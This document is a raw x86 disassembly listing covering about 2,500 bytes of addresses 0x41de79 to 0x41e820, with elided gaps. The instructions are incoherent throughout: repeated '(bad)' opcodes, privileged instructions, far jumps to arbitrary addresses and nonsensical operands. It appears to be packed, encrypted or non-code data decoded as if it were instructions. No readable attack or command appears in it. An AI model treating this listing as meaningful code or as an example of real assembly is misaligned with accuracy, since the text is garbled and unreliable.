  41de79:	neg    BYTE PTR [esi]
  41de7b:	mov    cl,0xc
  41de7d:	xchg   BYTE PTR [eax],ch
  41de7f:	or     eax,0x3cb73f7b
	...
  41dea0:	add    BYTE PTR [eax],al
  41dea2:	shl    ebx,0xee
  41dea5:	shr    DWORD PTR [edx],1
  41dea7:	outs   dx,DWORD PTR ds:[esi]
  41dea8:	cld    
  41dea9:	add    cl,BYTE PTR ds:0xbe03e33e
  41deaf:	test   BYTE PTR [ebx],dl
  41deb1:	ror    ebx,cl
  41deb3:	or     BYTE PTR [esi],dh
  41deb5:	lds    ecx,FWORD PTR [edx]
  41deb7:	int    0xff
  41deb9:	(bad)  
  41deba:	call   0x7a2034a6
  41debf:	mov    bl,0xf
  41dec1:	test   BYTE PTR [ecx+0x3558b3f],0x35
  41dec8:	or     eax,0xad055686
  41decd:	fst    DWORD PTR [ecx]
  41decf:	ins    DWORD PTR es:[edi],dx
  41ded0:	shl    BYTE PTR [ecx-0x45],cl
  41ded3:	xor    al,0xd
  41ded5:	ja     0x41dea2
  41ded7:	xor    al,0x66
  41ded9:	out    0x39,al
  41dedb:	ret    
  41dedc:	or     ebx,esi
  41dede:	cmp    BYTE PTR [ecx+0x1],bl
  41dee1:	fwait
  41dee2:	or     eax,0xfd4e0d4a
  41dee7:	add    al,0xad
  41dee9:	mov    ds:0xdef7cb97,al
  41deee:	sbb    DWORD PTR [eax+0x39],eax
  41def1:	mov    bh,0x9
  41def3:	jge    0x41de8d
  41def5:	jmp    0x3e4edf08
  41defa:	into   
  41defb:	jle    0x41df40
  41defd:	fst    DWORD PTR [ebp-0x4c95ec2b]
  41df03:	or     eax,DWORD PTR [eax]
  41df05:	jmp    0x0:0x0
	...
  41df24:	xlat   BYTE PTR ds:[ebx]
  41df25:	cmp    BYTE PTR [ebx-0x7],0xe
  41df29:	scas   al,BYTE PTR es:[edi]
  41df2a:	and    eax,0x890b4b62
  41df2f:	pushf  
  41df30:	push   es
  41df31:	add    ecx,eax
  41df33:	cdq    
  41df34:	test   DWORD PTR ds:0x350990e8,edi
  41df3a:	std    
  41df3b:	fidivr WORD PTR [eax+0x53e83ebc]
  41df41:	dec    DWORD PTR [edi+edx*2]
  41df44:	dec    ecx
  41df45:	out    0xfe,eax
  41df47:	stos   DWORD PTR es:[edi],eax
  41df48:	sbb    cl,BYTE PTR [ecx-0x3dda22bd]
  41df4e:	lldt   WORD PTR [esi+0x2c4f86d8]
  41df55:	mov    DWORD PTR [ebx+0x41],eax
  41df58:	test   DWORD PTR [ebp-0xb],0x106df53c
  41df5f:	mov    ebp,DWORD PTR [ecx]
  41df61:	or     al,0xff
  41df63:	ret    0x1df
  41df66:	mov    dl,BYTE PTR [ebx]
  41df68:	ins    BYTE PTR es:[edi],dx
  41df69:	or     eax,0xd3ff433d
  41df6e:	jno    0x41df66
  41df70:	mov    edi,0x19023927
  41df75:	ja     0xbf3fc3c0
  41df7b:	jmp    0x41df27
  41df7d:	test   BYTE PTR [edi],cl
  41df7f:	mov    BYTE PTR [ebp-0x33c4bfc5],dh
  41df85:	ins    DWORD PTR es:[edi],dx
  41df86:	repz jmp 0x41df89
	...
  41dfa5:	add    BYTE PTR [ecx-0x5a8afed2],ch
  41dfab:	test   DWORD PTR [ecx+0x10],eax
  41dfae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dfaf:	mov    ebp,0xf1e06e6
  41dfb4:	mov    BYTE PTR [ecx],dl
  41dfb6:	xor    eax,0x86d8383f
  41dfbb:	lock xchg BYTE PTR [ebp-0x14],cl
  41dfbf:	dec    BYTE PTR [edx+0xc]
  41dfc2:	std    
  41dfc3:	dec    eax
  41dfc4:	cmc    
  41dfc5:	cmp    esi,DWORD PTR [edx]
  41dfc7:	or     eax,DWORD PTR [esi-0x5052c92]
  41dfcd:	pop    esi
  41dfce:	scas   eax,DWORD PTR es:[edi]
  41dfcf:	ret    
  41dfd0:	ror    DWORD PTR [esp+eiz*2],0x4f
  41dfd4:	mov    ah,ch
  41dfd6:	mov    bh,0xe7
  41dfd8:	das    
  41dfd9:	push   ebx
  41dfda:	call   0x42f9:0x57d23051
  41dfe1:	xor    esp,esp
  41dfe3:	test   BYTE PTR [ecx-0x18],dl
  41dfe6:	or     eax,0x94efcea0
  41dfeb:	imul   ebx,DWORD PTR [ecx-0x79],0xffffff98
  41dfef:	add    al,0xfb
  41dff1:	push   edx
  41dff2:	stc    
  41dff3:	and    eax,0x270c8987
  41dff8:	add    DWORD PTR [ecx+0x538c1f50],ecx
  41dffe:	fnstenv [eax-0x1b791439]
  41e004:	adc    eax,DWORD PTR [edi-0x3601b0c0]
	...
  41e026:	add    BYTE PTR [eax],al
  41e028:	adc    dl,ch
  41e02a:	pushf  
  41e02b:	(bad)  
  41e02c:	fisub  DWORD PTR [edi]
  41e02e:	mov    cs,WORD PTR [ebx-0x1f]
  41e031:	mov    dl,0xcf
  41e033:	not    DWORD PTR [edi+0x5088141b]
  41e039:	data16 sti 
  41e03b:	dec    edx
  41e03c:	adc    eax,0xc3e7d2e
  41e041:	daa    
  41e042:	add    DWORD PTR [ebx+0x43428e3d],ecx
  41e048:	lods   eax,DWORD PTR ds:[esi]
  41e049:	sub    BYTE PTR [ecx],al
  41e04b:	add    BYTE PTR ds:0x483930b2,cl
  41e051:	dec    ebx
  41e052:	mov    eax,0x252c9659
  41e057:	xchg   DWORD PTR [eax],eax
  41e059:	stos   DWORD PTR es:[edi],eax
  41e05a:	lea    ebx,[ebx-0x7f]
  41e05d:	mov    dl,0xb7
  41e05f:	div    DWORD PTR ds:0xd372fe23
  41e065:	mov    eax,ds:0x36c03959
  41e06a:	mov    eax,0x2d5c860d
  41e06f:	cmp    BYTE PTR [ecx],al
  41e071:	add    ch,BYTE PTR [edi-0x47ce2dfb]
  41e077:	xadd   eax,edi
  41e07a:	leave  
  41e07b:	cmp    BYTE PTR ds:0x8a019c00,bh
  41e081:	mov    bl,0xe
  41e083:	mov    WORD PTR [esi+0x32b8d22f],fs
  41e089:	mov    bl,0xe9
  41e08b:	mov    WORD PTR [eax],es
	...
  41e0a9:	add    BYTE PTR [esi+0x32b86a2f],dl
  41e0af:	add    BYTE PTR [ebp+0xb],bh
  41e0b2:	inc    esp
  41e0b3:	mov    bl,0xfe
  41e0b5:	mov    dh,0xd
  41e0b7:	ret    0xff01
  41e0ba:	lea    ebx,[edx-0x4d7bfb3a]
  41e0c0:	test   BYTE PTR [edx],0x66
  41e0c3:	sub    al,0x2d
  41e0c5:	std    
  41e0c6:	pop    edi
  41e0c7:	or     al,0x4b
  41e0c9:	imul   eax,DWORD PTR [edx+esi*4+0x28468dca],0xe8c2c712
  41e0d4:	xchg   esi,eax
  41e0d5:	ret    
  41e0d6:	dec    esp
  41e0d7:	xchg   DWORD PTR [eax+eiz*1],edx
  41e0da:	test   dl,cl
  41e0dc:	xchg   esi,eax
  41e0dd:	in     eax,dx
  41e0de:	pop    edi
  41e0df:	cmp    BYTE PTR [edx-0x29],dh
  41e0e2:	scas   al,BYTE PTR es:[edi]
  41e0e3:	call   0x56b1ea7e
  41e0e8:	sub    DWORD PTR [ebx+0x68f64c1e],ecx
  41e0ee:	lahf   
  41e0ef:	clc    
  41e0f0:	pushf  
  41e0f1:	mov    edx,0x20148912
  41e0f6:	mov    al,dl
  41e0f8:	xchg   BYTE PTR ds:0x4fc48913,ch
  41e0fe:	mov    cl,dl
  41e100:	inc    esi
  41e101:	test   dh,ah
  41e103:	adc    esp,edi
  41e105:	xchg   al,dl
  41e107:	add    esp,edx
  41e109:	add    al,0x86
  41e10b:	(bad)  
  41e10c:	jmp    0x41e19d
	...
  41e129:	add    BYTE PTR [eax],al
  41e12b:	add    BYTE PTR [esi-0x219711f1],bh
  41e131:	or     eax,DWORD PTR [eax]
  41e133:	repnz rol BYTE PTR [edx],1
  41e136:	lea    esi,[edi+0x11]
  41e139:	add    BYTE PTR [eax],al
  41e13b:	es jb  0x41e18a
  41e13e:	sbb    BYTE PTR [edx+eax*1+0xa9c8900],0xb1
  41e146:	add    al,0x63
  41e148:	push   edx
  41e149:	xor    ecx,DWORD PTR [eax-0x7644e20b]
  41e14f:	lods   al,BYTE PTR ds:[esi]
  41e150:	inc    esi
  41e151:	inc    eax
  41e152:	fucomip st,st(5)
  41e154:	adc    BYTE PTR [eax-0x78],cl
  41e157:	(bad)  
  41e159:	mov    DWORD PTR [ebx-0x37],ecx
  41e15c:	xor    al,0x3b
  41e15e:	ror    al,0xea
  41e161:	xchg   BYTE PTR [ecx-0x2a],dl
  41e164:	adc    BYTE PTR [esi+0x1],al
  41e167:	mov    cl,0x86
  41e169:	les    esi,FWORD PTR [eax+ebp*8]
  41e16c:	mov    DWORD PTR ds:0x1f837002,edi
  41e172:	xchg   DWORD PTR [edi*8-0x4666a486],ebp
  41e179:	inc    eax
  41e17a:	jnp    0x41e1a6
  41e17c:	or     bh,0xdf
  41e17f:	jb     0x41e154
  41e181:	sub    eax,DWORD PTR [ecx]
  41e183:	mov    eax,0x62d3cf97
  41e188:	retf   
  41e189:	push   edi
  41e18a:	xchg   DWORD PTR [ecx+ebp*8],ebx
  41e18d:	sub    BYTE PTR [edx],bl
  41e18f:	jb     0x41e191
	...
  41e1ad:	add    BYTE PTR [ebx+0x2b],dl
  41e1b0:	jmp    0xf3f96b91
  41e1b5:	outs   dx,BYTE PTR ds:[esi]
  41e1b6:	stos   BYTE PTR es:[edi],al
  41e1b7:	jns    0x73cb1079
  41e1bd:	icebp  
  41e1be:	cwde   
  41e1bf:	xlat   BYTE PTR ds:[ebx]
  41e1c0:	pop    ss
  41e1c1:	jmp    0xf84e:0x1b1c87bf
  41e1c8:	dec    edx
  41e1c9:	add    al,dh
  41e1cb:	push   0xffffffe3
  41e1cd:	mov    edi,DWORD PTR [ecx+0xf]
  41e1d0:	sti    
  41e1d1:	inc    ebp
  41e1d2:	add    dh,bh
  41e1d4:	dec    eax
  41e1d5:	loopne 0x41e186
  41e1d7:	cmp    ecx,esi
  41e1d9:	cmp    edi,DWORD PTR [ecx-0x31]
  41e1dc:	jnp    0x41e1ae
  41e1de:	or     esi,DWORD PTR [edx-0xb]
  41e1e1:	mov    ebp,DWORD PTR [ecx+0xf]
  41e1e4:	xor    eax,0x8c07fc4d
  41e1e9:	sahf   
  41e1ea:	or     bh,al
  41e1ec:	cli    
  41e1ed:	xor    esp,DWORD PTR [esi]
  41e1ef:	dec    BYTE PTR [eax-0x24]
  41e1f2:	cmc    
  41e1f3:	cmp    ecx,ebp
  41e1f5:	inc    eax
  41e1f6:	mov    edi,0x780f1171
  41e1fb:	push   0xfffffffb
  41e1fd:	dec    ebx
  41e1ff:	xchg   BYTE PTR [ecx+0xc],al
  41e202:	outs   dx,BYTE PTR ds:[esi]
  41e203:	dec    ecx
  41e204:	aad    0x88
  41e206:	in     al,dx
  41e207:	test   ebx,eax
  41e209:	pop    edi
  41e20a:	sub    dl,BYTE PTR [edi-0x3a]
  41e20d:	ret    0xfeac
  41e210:	rol    BYTE PTR cs:[eax],0x0
	...
  41e230:	iret   
  41e231:	lock push eax
  41e233:	mov    edi,DWORD PTR [eax+0x7e]
  41e236:	in     al,dx
  41e237:	dec    eax
  41e238:	aas    
  41e239:	dec    ecx
  41e23a:	add    eax,0x5617dd8b
  41e23f:	push   edi
  41e240:	sub    eax,0xf98bed49
  41e245:	ja     0xd930245
  41e24b:	add    edi,DWORD PTR [esi+edi*8-0xdfdcc07]
  41e252:	inc    eax
  41e253:	std    
  41e254:	fs hlt 
  41e256:	inc    eax
  41e257:	(bad)  
  41e258:	or     DWORD PTR fs:[ecx-0x48],0xffffffdd
  41e25d:	js     0x41e21c
  41e25f:	mov    DWORD PTR ds:0x4c392964,ecx
  41e265:	push   ecx
  41e266:	mov    BYTE PTR [edx+0x2901290c],bh
  41e26c:	push   ebp
  41e26d:	xchg   ebp,eax
  41e26e:	mov    WORD PTR [ebx+0x51],cs
  41e271:	mov    ebp,0x58e08900
  41e276:	mov    al,BYTE PTR [ebx+0x4d]
  41e279:	scas   eax,DWORD PTR es:[edi]
  41e27a:	into   
  41e27b:	jmp    0x41e263
  41e27d:	clc    
  41e27e:	add    al,0x8b
  41e280:	xchg   ecx,eax
  41e281:	daa    
  41e282:	add    DWORD PTR [eax],eax
  41e284:	out    0xe6,al
  41e286:	mov    al,BYTE PTR [ebx+0x3d]
  41e289:	or     eax,0x17508901
  41e28e:	stos   BYTE PTR es:[edi],al
  41e28f:	pcmpgtb mm4,QWORD PTR [eax+0xf3c6]
	...
  41e2b2:	test   BYTE PTR [ebp+edx*2+0x9ccc39],dl
  41e2b9:	xchg   DWORD PTR [eax+0x4b],edx
  41e2bc:	mov    al,BYTE PTR [ebx-0x2f]
  41e2bf:	push   cs
  41e2c0:	inc    ebx
  41e2c1:	jnp    0x41e2d1
  41e2c3:	mov    al,ds:0xdc86dbbf
  41e2c8:	push   edi
  41e2c9:	or     eax,0xd2be482
  41e2ce:	jp     0x41e2e4
  41e2d0:	sub    BYTE PTR [ecx-0x32de0c8],cl
  41e2d6:	cmp    BYTE PTR [ebx-0x70628cca],dl
  41e2dc:	inc    eax
  41e2dd:	cld    
  41e2de:	mov    ds:0x38ad068a,al
  41e2e3:	mov    ecx,DWORD PTR [edx-0x4051feb5]
  41e2e9:	out    dx,eax
  41e2ea:	mov    ?,esp
  41e2ec:	pop    ds
  41e2ed:	add    BYTE PTR [esi-0x77ffdbfc],cl
  41e2f3:	arpl   WORD PTR [ebx],ax
  41e2f5:	inc    esi
  41e2f6:	dec    ebx
  41e2f7:	add    dh,ch
  41e2f9:	add    edx,DWORD PTR [edx-0x39736555]
  41e2ff:	push   edi
  41e300:	pusha  
  41e301:	rcl    BYTE PTR [edx+0x3a],0xa4
  41e305:	ss or  eax,0xd0eac3a
  41e30b:	cmp    ah,BYTE PTR [edi+ecx*2+0x37ac3b42]
  41e312:	cmp    bh,BYTE PTR [edx+edx*1-0x4b]
	...
  41e332:	add    BYTE PTR [eax],al
  41e334:	fdivr  QWORD PTR [esp+eiz*4+0x1f]
  41e338:	or     eax,0xfd89e3ab
  41e33d:	xchg   DWORD PTR [esi+esi*1-0x3f2eff79],edi
  41e344:	adc    DWORD PTR [ebx+0x1c4e36eb],ebp
  41e34a:	adc    dl,BYTE PTR [eax]
  41e34c:	mov    WORD PTR [edx-0x681fcfa],?
  41e352:	and    al,0xc0
  41e354:	idiv   bh
  41e356:	outs   dx,BYTE PTR ds:[esi]
  41e357:	mov    edi,0xd23f601
  41e35c:	pop    esi
  41e35d:	or     edx,esi
  41e35f:	mov    edi,0x4c2484ba
  41e364:	rol    dl,1
  41e366:	sahf   
  41e367:	les    ecx,FWORD PTR [ebp-0x75fb614e]
  41e36d:	mov    edx,0x24ceb59e
  41e372:	jecxz  0x41e3b1
  41e374:	dec    esi
  41e375:	dec    esp
  41e376:	out    0x88,eax
  41e378:	dec    esi
  41e379:	sbb    al,0xe2
  41e37b:	mov    esi,0x89dea9c2
  41e380:	dec    esi
  41e381:	xor    DWORD PTR [ecx-0x31],esp
  41e384:	stc    
  41e385:	and    al,0xed
  41e387:	mov    esi,ecx
  41e389:	or     BYTE PTR [ecx-0x31],dh
  41e38c:	cmp    DWORD PTR [edi+0x0],0x880043f4
  41e393:	adc    al,0x0
  41e395:	lods   al,BYTE PTR ds:[esi]
  41e396:	add    ah,BYTE PTR [ebx]
	...
  41e3b4:	add    BYTE PTR [eax],al
  41e3b6:	stos   BYTE PTR es:[edi],al
  41e3b7:	cmp    al,0x74
  41e3b9:	out    dx,eax
  41e3ba:	mov    es,WORD PTR [edx]
  41e3bc:	add    ah,BYTE PTR [ecx+0xd]
  41e3bf:	add    al,dh
  41e3c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e3c2:	sbb    esi,DWORD PTR [ecx]
  41e3c4:	test   DWORD PTR [edx+ecx*1-0x5438046],ebp
  41e3cb:	dec    DWORD PTR [esp+ebp*2]
  41e3ce:	mov    ebx,0x8ee8ffff
  41e3d3:	add    cl,BYTE PTR [eax]
  41e3d5:	imul   esp,DWORD PTR [edx+0x4c],0xac207300
  41e3dc:	sbb    al,0x69
  41e3de:	bound  esi,QWORD PTR [edx]
  41e3e0:	add    BYTE PTR [ebx+0x42],ah
  41e3e3:	or     esi,DWORD PTR [esp+ebp*8+0x4]
  41e3e7:	sar    eax,cl
  41e3e9:	jne    0x41e412
  41e3eb:	cld    
  41e3ec:	add    esp,DWORD PTR [ecx-0x8]
  41e3ef:	xchg   DWORD PTR [edi+ebx*8],edx
  41e3f2:	xor    bl,al
  41e3f4:	std    
  41e3f5:	call   0x283ab790
  41e3fa:	xor    al,0xf8
  41e3fc:	or     edi,ecx
  41e3fe:	sbb    bl,al
  41e400:	std    
  41e401:	jmp    0x3d3ee98c
  41e406:	pop    ebp
  41e407:	jnp    0x41e40d
  41e409:	out    dx,eax
  41e40a:	stc    
  41e40b:	mov    dl,0xc3
  41e40d:	mov    dh,0x6b
  41e40f:	dec    ebx
  41e410:	std    
  41e411:	xor    al,0xfd
  41e413:	iret   
  41e414:	cld    
  41e415:	sbb    al,0xe1
  41e417:	pop    ss
  41e418:	scas   al,BYTE PTR es:[edi]
  41e419:	popf   
	...
  41e436:	add    BYTE PTR [eax],al
  41e438:	fldcw  WORD PTR [ecx+eax*1]
  41e43b:	cdq    
  41e43c:	sbb    eax,DWORD PTR [eax+0x73]
  41e43f:	xlat   BYTE PTR ds:[ebx]
  41e440:	fnstenv [edx-0x637cff25]
  41e446:	dec    eax
  41e447:	call   0x1033424f
  41e44c:	cmp    edi,DWORD PTR [esi]
  41e44e:	jmp    0x87355e52
  41e453:	jne    0x41e405
  41e455:	in     eax,dx
  41e456:	add    al,BYTE PTR [ecx]
  41e458:	fbstp  TBYTE PTR [ebp+0x5]
  41e45b:	mov    BYTE PTR [ecx-0x3dba780a],ch
  41e461:	ficomp DWORD PTR [ebx-0x790c2c05]
  41e467:	inc    ebp
  41e468:	xor    BYTE PTR [eax-0x4],dl
  41e46b:	jne    0x41e461
  41e46d:	inc    ebp
  41e46f:	push   eax
  41e470:	int3   
  41e471:	sub    BYTE PTR [esi],cl
  41e473:	add    DWORD PTR [eax+eax*1],esi
  41e476:	out    dx,eax
  41e477:	sub    DWORD PTR [ecx-0x19],0xf
  41e47b:	mov    ebp,DWORD PTR [ecx-0x19]
  41e47e:	jle    0x41e4ed
  41e480:	aam    0x12
  41e482:	aaa    
  41e483:	inc    ebp
  41e484:	xor    al,0x4
  41e486:	mov    WORD PTR [ebx+0x2],?
  41e489:	repz cli 
  41e48b:	sub    DWORD PTR [ecx-0x5674f026],0xffffffda
  41e492:	jle    0x41e501
  41e494:	mov    al,ds:0xac453713
  41e499:	add    cl,BYTE PTR [edi+ecx*2+0x0]
	...
  41e4b8:	add    BYTE PTR [eax],al
  41e4ba:	ret    0xfaf2
  41e4bd:	pop    ebx
  41e4be:	and    ebp,DWORD PTR [edi-0x3a82a13b]
  41e4c4:	ltr    WORD PTR [ecx]
  41e4c7:	scas   eax,DWORD PTR es:[edi]
  41e4c8:	jmp    0x41e44d
  41e4ca:	rcr    BYTE PTR [edi],1
  41e4cc:	push   eax
  41e4cd:	push   esi
  41e4ce:	sbb    esi,DWORD PTR [edi]
  41e4d0:	iret   
  41e4d1:	xor    esi,DWORD PTR [ebx+0x3a]
  41e4d4:	xor    al,al
  41e4d6:	sbb    eax,0xd89e949
  41e4db:	in     al,dx
  41e4dc:	aaa    
  41e4dd:	xchg   DWORD PTR [eax],edi
  41e4df:	pop    ebp
  41e4e0:	jnp    0x41e55d
  41e4e2:	jne    0x41e523
  41e4e4:	fcom   DWORD PTR [ebx]
  41e4e6:	adc    bl,BYTE PTR [edi+0x187aff68]
  41e4ec:	jle    0x41e539
  41e4ee:	add    eax,0x94dfd6a0
  41e4f3:	jae    0x41e526
  41e4f5:	mov    eax,edx
  41e4f7:	sub    BYTE PTR [ebx+edx*2+0x59],bh
  41e4fb:	adc    DWORD PTR [esi],edi
  41e4fd:	or     eax,0x43e83
  41e502:	or     eax,0x96fbbeb2
  41e507:	xchg   ebx,eax
  41e508:	xor    DWORD PTR [ecx],eax
  41e50a:	inc    esp
  41e50b:	lahf   
  41e50c:	mov    esi,0xffb602d7
  41e511:	or     DWORD PTR [ebx+0x1217c021],esi
  41e517:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e518:	xlat   BYTE PTR ds:[ebx]
  41e519:	(bad)  
  41e51a:	sbb    bl,BYTE PTR [eax]
  41e51c:	jle    0x41e4f5
	...
  41e53a:	add    BYTE PTR [eax],al
  41e53c:	test   BYTE PTR [ebx+0x55],bl
  41e53f:	mov    ebx,DWORD PTR [ebp+0x6]
  41e542:	dec    ecx
  41e543:	inc    ebx
  41e544:	jmp    0xd41e661
  41e549:	mov    ds:0x53483933,al
  41e54e:	mov    al,0x5e
  41e550:	xchg   esi,eax
  41e551:	hlt    
  41e552:	xor    eax,DWORD PTR [edi+0x4b7e1f50]
  41e558:	mov    ch,0xa2
  41e55a:	scas   eax,DWORD PTR es:[edi]
  41e55b:	imul   DWORD PTR [ebx+0x10]
  41e55e:	adc    BYTE PTR ds:0x7b7cf340,cl
  41e564:	shl    DWORD PTR [edx+0x47483941],0xb0
  41e56b:	or     al,0x86
  41e56d:	or     al,0x2c
  41e56f:	data16 in al,0xff
  41e572:	add    ch,BYTE PTR [ebp-0x10d9f9e1]
  41e578:	pop    ss
  41e579:	adc    BYTE PTR [ebx],dl
  41e57b:	xor    eax,0xb896e940
  41e580:	adc    BYTE PTR [edi+0x4],dh
  41e583:	and    BYTE PTR [edx-0x8118d55],cl
  41e589:	xor    esi,esp
  41e58b:	push   es
  41e58c:	mov    ch,BYTE PTR [ebx+0x23e68672]
  41e592:	out    0xb1,eax
  41e594:	or     ch,cl
  41e596:	fistp  DWORD PTR [edi]
  41e598:	fld    DWORD PTR [eax]
  41e59a:	test   eax,0xc481091e
  41e59f:	daa    
	...
  41e5bc:	add    BYTE PTR [eax],al
  41e5be:	or     eax,0xc13b479
  41e5c3:	aaa    
  41e5c4:	call   0xf2082889
  41e5c9:	mov    eax,0x7e7eac1e
  41e5ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e5cf:	pop    ss
  41e5d0:	jb     0x41e592
  41e5d2:	fldcw  WORD PTR ss:[ebx-0x57b01bd1]
  41e5d9:	lds    ecx,FWORD PTR [ebx+0x5e7dfed3]
  41e5df:	xor    al,0xd2
  41e5e1:	fadd   DWORD PTR [esi]
  41e5e3:	jns    0x41e581
  41e5e5:	sbb    esp,DWORD PTR [eax+esi*1]
  41e5e8:	out    0x62,al
  41e5ea:	fcmovb st,st(1)
  41e5ec:	pop    edi
  41e5ed:	mov    eax,0x3695fcc2
  41e5f2:	and    al,0x4e
  41e5f4:	pop    ebp
  41e5f5:	cld    
  41e5f6:	test   edx,ecx
  41e5f8:	mov    esi,0xc224467b
  41e5fd:	or     dl,BYTE PTR [edx+ecx*8+0x245e7b9e]
  41e604:	scas   eax,DWORD PTR es:[di]
  41e606:	push   ss
  41e607:	add    BYTE PTR [eax],al
  41e609:	fs int3 
  41e60b:	(bad)  
  41e60c:	jb     0x41e5f8
  41e60e:	sub    edi,DWORD PTR [ebx-0x3458dfd]
  41e614:	or     al,0x4e
  41e616:	ret    0x110
  41e619:	mov    ebx,0x5e0d36a0
  41e61e:	sar    edi,1
  41e620:	(bad)  
  41e621:	call   0x41e626
	...
  41e63e:	add    BYTE PTR [eax],al
  41e640:	cmp    eax,0xaa69dbc1
  41e645:	or     BYTE PTR [eax],al
  41e647:	bound  edi,QWORD PTR [edx-0x16238d08]
  41e64d:	mov    eax,0xf30d71d3
  41e652:	xchg   ebp,ecx
  41e654:	push   ebp
  41e655:	sub    eax,0x7a0b2e82
  41e65a:	dec    ebx
  41e65b:	dec    ebp
  41e65c:	ror    DWORD PTR [esp+eax*1-0xd],1
  41e660:	push   es
  41e661:	js     0x41e66f
  41e663:	idiv   BYTE PTR [eax-0x9c81c48]
  41e669:	aas    
  41e66a:	(bad)  
  41e66c:	stos   DWORD PTR es:[edi],eax
  41e66d:	into   
  41e66e:	cld    
  41e66f:	repz loopne 0x41e670
  41e672:	xlat   BYTE PTR ds:[ebx]
  41e673:	jno    0x41e6c2
  41e675:	repz (bad) 
  41e677:	imul   eax,esp,0x268c8701
  41e67d:	add    DWORD PTR [ebx+0x1],0xffffff86
  41e681:	(bad)  
  41e682:	rol    edx,cl
  41e684:	push   ecx
  41e685:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e686:	inc    edx
  41e687:	(bad)  
  41e688:	ficomp DWORD PTR [edi]
  41e68a:	mov    DWORD PTR [edx+edi*1-0x448f30ff],ebx
  41e691:	push   ebx
  41e692:	mov    DWORD PTR [ecx+esi*1],esi
  41e695:	adc    DWORD PTR [ebx-0x33],0xfffffff1
  41e699:	or     ecx,DWORD PTR [ecx+0x1518fd1c]
  41e69f:	add    BYTE PTR [edi],dh
  41e6a1:	pop    edx
  41e6a2:	cmc    
  41e6a3:	inc    DWORD PTR [eax]
	...
  41e6c1:	add    BYTE PTR [eax],al
  41e6c3:	push   es
  41e6c4:	xchg   DWORD PTR [ebp-0x40],edx
  41e6c7:	pop    ecx
  41e6c8:	mov    BYTE PTR [ebp-0x44],dh
  41e6cb:	lods   al,BYTE PTR ds:[esi]
  41e6cc:	pop    eax
  41e6cd:	or     BYTE PTR [edi-0x3f769a32],dh
  41e6d3:	push   esp
  41e6d4:	ds cmp ebp,ecx
  41e6d7:	mov    ebx,0x69efe47b
  41e6dc:	or     eax,0xfcdc31ff
  41e6e1:	dec    esp
  41e6e2:	nop
  41e6e3:	lods   al,BYTE PTR ds:[esi]
  41e6e4:	dec    eax
  41e6e5:	clc    
  41e6e6:	mov    edi,0x8a7cd16a
  41e6eb:	lock inc eax
  41e6ed:	cld    
  41e6ee:	fild   QWORD PTR [ecx+0xd]
  41e6f1:	cmp    DWORD PTR [ecx-0x1f73f525],ebp
  41e6f7:	lock cli 
  41e6f9:	jmp    DWORD PTR [edi]
  41e6fb:	sar    ah,cl
  41e6fd:	dec    esp
  41e6fe:	aam    0x3
  41e700:	lds    eax,FWORD PTR [ecx]
  41e702:	imul   ebp,edi,0x13613b3f
  41e708:	or     ecx,DWORD PTR [esi+edx*2-0x6000050f]
  41e70f:	inc    ecx
  41e710:	or     DWORD PTR [edx+0x887bb69],ecx
  41e716:	scas   eax,DWORD PTR es:[edi]
  41e717:	mov    bh,0x5a
  41e719:	pop    esi
  41e71a:	mov    edi,0xf418c1e5
  41e71f:	xor    edi,DWORD PTR [ebp-0x77aafe15]
  41e725:	in     al,dx
	...
  41e742:	add    BYTE PTR [eax],al
  41e744:	or     edx,DWORD PTR [bx+si-0x75]
  41e748:	mov    DWORD PTR [esi],esp
  41e74a:	mov    BYTE PTR [ecx+0x8],cl
  41e74d:	push   edx
  41e74e:	push   esp
  41e74f:	mov    DWORD PTR [ecx],ebp
  41e751:	call   0x2d4f34dc
  41e756:	jp     0x41e752
  41e758:	xchg   esi,eax
  41e759:	repz adc eax,DWORD PTR [ecx]
  41e75c:	aad    0x15
  41e75e:	daa    
  41e75f:	xor    ebx,eax
  41e761:	(bad)  
  41e762:	(bad)  
  41e763:	std    
  41e764:	or     eax,0xdfcc75b
  41e769:	mov    al,ds:0xe394afbe
  41e76e:	outs   dx,DWORD PTR ds:[esi]
  41e76f:	xchg   DWORD PTR [eax+0x7d],edx
  41e772:	jmp    0x24e5ea35
  41e777:	dec    DWORD PTR [edx-0x213825e8]
  41e77d:	scas   eax,DWORD PTR es:[edi]
  41e77e:	mov    esi,0x7a1566c7
  41e783:	push   ebx
  41e784:	sbb    eax,0x94bbc69e
  41e789:	adc    esi,DWORD PTR [ecx+edi*1]
  41e78c:	cmp    eax,0xcb78031
  41e791:	sbb    DWORD PTR [ecx],eax
  41e793:	sub    DWORD PTR [edi-0x61],ecx
  41e796:	(bad)  
  41e797:	retf   
  41e798:	ss adc eax,0x4e51437a
  41e79e:	adc    DWORD PTR [edi-0x7c],edx
  41e7a1:	pop    ebx
  41e7a2:	sub    DWORD PTR [edi-0x4116ef40],eax
	...
  41e7c4:	add    BYTE PTR [eax],al
  41e7c6:	test   al,0x15
  41e7c8:	jl     0x41e80d
  41e7ca:	and    eax,0xd6c7c6ad
  41e7cf:	xlat   BYTE PTR ds:[ebx]
  41e7d0:	scas   al,BYTE PTR es:[edi]
  41e7d1:	add    BYTE PTR [ebx+ebx*2-0x109776b7],al
  41e7d8:	cld    
  41e7d9:	mov    ah,0x50
  41e7db:	adc    edi,ebp
  41e7dd:	mov    ah,0x60
  41e7df:	daa    
  41e7e0:	jp     0x41e85d
  41e7e2:	add    eax,0xe5732e86
  41e7e7:	sbb    bh,BYTE PTR [eax-0x2eff0a0d]
  41e7ed:	sub    ebx,eax
  41e7ef:	sub    esi,ebp
  41e7f1:	pop    esi
  41e7f2:	sub    BYTE PTR ss:[edx-0x40],ah
  41e7f6:	push   ss
  41e7f7:	jne    0x41e81d
  41e7f9:	cmp    BYTE PTR [ebx+eiz*4-0x5c73fc5e],cl
  41e800:	mov    BYTE PTR [ebx],0x8c
  41e803:	mov    ds:0xa38c03be,eax
  41e808:	ret    0x9603
  41e80b:	in     al,dx
  41e80c:	hlt    
  41e80d:	(bad)
  41e810:	out    0x7c,eax
  41e812:	push   ds
  41e813:	je     0x41e875
  41e815:	rcr    BYTE PTR [esi+0x77],1
  41e818:	and    al,0x48
  41e81a:	dec    ebx
  41e81b:	ret    
  41e81c:	xchg   esi,eax
  41e81d:	add    al,0x53
  41e81f:	ret    
  41e820:	aad    0x4
